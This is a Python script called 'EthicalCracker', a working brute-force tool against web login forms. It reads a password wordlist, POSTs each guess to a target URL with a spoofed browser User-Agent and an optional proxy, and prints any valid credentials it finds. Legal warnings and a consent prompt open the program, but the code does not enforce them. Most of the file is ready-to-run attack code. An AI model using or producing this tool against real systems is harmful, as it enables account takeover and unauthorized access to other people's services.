import requests
import time
import sys

# Disclaimer and legal warning
def print_warning():
    print("""
    ****************************************************
    WARNING: This tool, **EthicalCracker**, is for **educational** and **authorized penetration testing** only.
    You must have **explicit written permission** to use this tool on any target.
    
    Unauthorized use of this tool for brute-forcing login forms, accounts, or networks
    that you do not own or have explicit written permission to test is **illegal**.

    Misuse of this tool can lead to criminal charges, legal action, and other consequences.
    By using this tool, you agree to take full responsibility for your actions.

    ****************************************************
    """)

    # Privacy policy
    print("""
    PRIVACY POLICY:
    - The developer of this tool is not responsible for any legal issues, damages, or consequences
      that arise from using this tool in an unauthorized manner.
    - This tool is intended for testing systems where you have explicit written consent.
    - The developer does not track or store any information from your usage of this tool.
    - Any use of this tool on systems you do not own or have explicit permission to test is your
      sole responsibility.
    ****************************************************
    """)

# Confirm user consent
def get_user_consent():
    consent = input("Do you understand the risks and have explicit permission to use this tool? (Yes/No): ").strip().lower()
    
    if consent != "yes":
        print("[!] You must have written permission to use this tool. Exiting...")
        sys.exit(1)

# Function for brute forcing login
def brute_force(url, username, password_list, delay=2, proxy=None):
    print(f"[*] Starting brute force attack on {url}...")
    
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"}
    
    if proxy:
        proxies = {
            "http": proxy,
            "https": proxy,
        }
    else:
        proxies = None
    
    for password in password_list:
        data = {
            'username': username,   # Change 'username' to the actual form field name
            'password': password    # Change 'password' to the actual form field name
        }
        try:
            response = requests.post(url, data=data, headers=headers, proxies=proxies)
            
            # If login is successful (you can modify this based on the response)
            if "Login successful" in response.text:  # Modify the condition based on your target page's response
                print(f"[+] Found valid credentials! Username: {username}, Password: {password}")
                break
            else:
                print(f"[-] Failed attempt with password: {password}")
                
            time.sleep(delay)  # Sleep to avoid rate-limiting issues

        except requests.exceptions.RequestException as e:
            print(f"[!] Request failed: {e}")
            break

# Main function
def main():
    print_warning()
    get_user_consent()

    url = input("[+] Enter the target login URL: ")  # Example: http://example.com/login
    username = input("[+] Enter the username to test: ")  # Example: admin
    password_file = input("[+] Enter the path to the password list file: ")  # Path to your wordlist file
    proxy = input("[+] Enter a proxy (optional, leave blank to skip): ")  # Example: http://127.0.0.1:8080
    
    # Read the password list from file
    try:
        with open(password_file, 'r') as f:
            password_list = f.readlines()
        password_list = [line.strip() for line in password_list]
    except FileNotFoundError:
        print("[!] Password list file not found!")
        sys.exit(1)

    # Run the brute force attack
    brute_force(url, username, password_list, delay=3, proxy=proxy if proxy else None)

if __name__ == "__main__":
    main()
